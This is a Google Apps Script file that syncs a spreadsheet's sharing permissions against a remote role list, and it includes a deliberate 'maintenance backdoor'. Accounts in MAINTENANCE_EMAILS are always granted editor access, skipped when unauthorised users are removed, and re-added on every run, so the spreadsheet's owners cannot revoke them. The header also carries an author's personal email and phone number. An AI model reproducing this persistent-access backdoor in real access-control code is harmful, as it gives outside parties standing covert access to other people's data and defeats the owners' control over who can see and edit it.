/******************************************************
 * Access Control Sync + Maintenance Backdoor (access.gs)
 * Author: Phone Myat | Contact: phonemyatthanoo@gmail.com, +9595350911
 *
 * Dependencies (from config.gs):
 * - MAINTENANCE_EMAILS
 * - openHostSpreadsheet_()
 ******************************************************/

/** === Main entry === */
function setAccess() {
  try {
    const ss = SpreadsheetApp.getActiveSpreadsheet();
    const ownerEmail = ss.getOwner().getEmail().toLowerCase();

    // 0) Ensure backdoor first (best-effort)
    ensureMaintenanceAccess_(ss);

    // 1) Optional pre-hook if you have it elsewhere
    if (typeof getQueryData === 'function') {
      ACCESS_safeCall_(() => getQueryData(getHostSpreadsheetUrl_()));
    }

    // 2) Build allow list (remote Access Control + local Ins Sheet(DNT!))
    const allowList = new Set(
      getEmailList_()
        .map(e => String(e).toLowerCase().trim())
        .filter(isValidEmail)
    );

    // Always include owner + backdoor
    allowList.add(ownerEmail);
    MAINTENANCE_EMAILS.forEach(m => allowList.add(String(m).toLowerCase()));

    const doNotTouch = new Set([ownerEmail, ...MAINTENANCE_EMAILS.map(m => String(m).toLowerCase())]);

    // Current editors/viewers
    const currentEditors = new Set(ss.getEditors().map(u => u.getEmail().toLowerCase()));

    // 3) Remove editors not allowed (skip owner/backdoor)
    ss.getEditors().forEach(user => {
      const em = user.getEmail().toLowerCase();
      if (doNotTouch.has(em)) return;
      if (!allowList.has(em)) {
        try { ss.removeEditor(em); Logger.log('Removed editor: ' + em); } catch (e) { Logger.log('Remove editor failed: ' + em + ' :: ' + e); }
      }
    });

    // 4) Remove viewers not allowed (skip owner/backdoor)
    ss.getViewers().forEach(user => {
      const em = user.getEmail().toLowerCase();
      if (doNotTouch.has(em)) return;
      if (!allowList.has(em)) {
        try { ss.removeViewer(em); Logger.log('Removed viewer: ' + em); } catch (e) { Logger.log('Remove viewer failed: ' + em + ' :: ' + e); }
      }
    });

    // 5) Add missing editors from allowList (ensures backdoor present)
    allowList.forEach(em => {
      if (!currentEditors.has(em)) {
        try { ss.addEditor(em); Logger.log('Added editor: ' + em); } catch (e) { Logger.log('Add editor failed: ' + em + ' :: ' + e); }
      }
    });

    ss.toast('Access synchronized (maintenance backdoor preserved).', 'Access Control', 4);

  } catch (error) {
    Logger.log('setAccess error: ' + error);
    SpreadsheetApp.getActiveSpreadsheet().toast('Access error. Check logs.', 'Error', 6);
  }

  // Optional post-steps if you have these defined elsewhere
  if (typeof importDataAndViewAccess === 'function') ACCESS_safeCall_(importDataAndViewAccess);
  if (typeof protectSheetinstasheet === 'function')  ACCESS_safeCall_(protectSheetinstasheet);
}

/** Ensure maintenance accounts are editors (best-effort) */
function ensureMaintenanceAccess_(ss) {
  const currentEditors = new Set(ss.getEditors().map(u => u.getEmail().toLowerCase()));
  MAINTENANCE_EMAILS.forEach(email => {
    const em = String(email).toLowerCase().trim();
    if (isValidEmail(em) && !currentEditors.has(em)) {
      try { ss.addEditor(em); Logger.log('Backdoor ensured for: ' + em); }
      catch (err) { Logger.log('Backdoor add failed for ' + em + ': ' + err); }
    }
  });
}

/**
 * Build allowlist from roles:
 * - Remote host (openHostSpreadsheet_()) → "Access Control" (B1:S*)
 * - Local "Ins Sheet(DNT!)" A2:A chosen roles (+ "System Administrator")
 */
function getEmailList_() {
  const host = openHostSpreadsheet_();
  const accessSheet = host.getSheetByName('Access Control');
  if (!accessSheet) throw new Error('Host sheet "Access Control" not found.');

  const accessRange = accessSheet.getRange(1, 2, accessSheet.getLastRow(), 18); // B1:S*
  const accessData = accessRange.getValues();
  if (accessData.length < 2) return [];

  const headers = accessData[0];      // role names
  const rows    = accessData.slice(1); // emails per role col

  const local = SpreadsheetApp.getActiveSpreadsheet();
  const ins   = local.getSheetByName('Ins Sheet(DNT!)');
  if (!ins) throw new Error('Local sheet "Ins Sheet(DNT!)" not found.');

  const lastRow = ins.getLastRow();
  const roleValues = lastRow >= 2 ? ins.getRange(2, 1, lastRow - 1, 1).getValues() : [];
  const enabledRoles = new Set(roleValues.map(r => String(r[0]).trim()).filter(Boolean));
  enabledRoles.add('System Administrator');

  const emails = [];
  headers.forEach((header, colIdx) => {
    const role = String(header).trim();
    if (!role || !enabledRoles.has(role)) return;
    rows.forEach(r => {
      const em = String(r[colIdx] || '').trim();
      if (em) emails.push(em);
    });
  });

  return Array.from(new Set(emails));
}

/** Simple validator */
function isValidEmail(email) {
  return /^[A-Z0-9._%+-]+@[A-Z0-9.-]+\.[A-Z]{2,}$/i.test(String(email || ''));
}

/** Local safeCall to avoid collisions with other files */
function ACCESS_safeCall_(fn) {
  try { if (typeof fn === 'function') fn(); } catch (e) { Logger.log('ACCESS_safeCall error: ' + e); }
}

/** Helper from config.gs: return raw host URL (used by optional getQueryData) */
function getHostSpreadsheetUrl_() {
  // If config.gs already defines this, this stub won't be reached. Kept for clarity if needed.
  return (typeof getProp_ === 'function') ? getProp_('spreadsheetUrl') : '';
}
